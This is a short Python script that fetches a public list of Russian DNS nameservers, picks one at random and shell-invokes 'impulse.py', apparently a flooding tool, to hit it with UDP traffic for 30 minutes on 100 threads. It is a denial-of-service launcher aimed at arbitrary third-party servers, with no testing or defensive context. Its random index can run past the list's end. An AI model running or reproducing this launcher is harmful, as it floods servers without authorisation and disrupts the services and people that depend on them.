import urllib.request, json, random, subprocess

if __name__ == "__main__":
    target = 'https://public-dns.info/nameserver/ru.json'
    with urllib.request.urlopen(target) as url:
        data = json.loads(url.read().decode())
        random_ip = data[random.randint(0,len(data))]['ip']
        print(random_ip)
        subprocess.run(
            [f"python3 impulse.py --target {random_ip}:54 --time 1800 --threads 100 --method UDP"],
            check = True,
            shell = True
        )
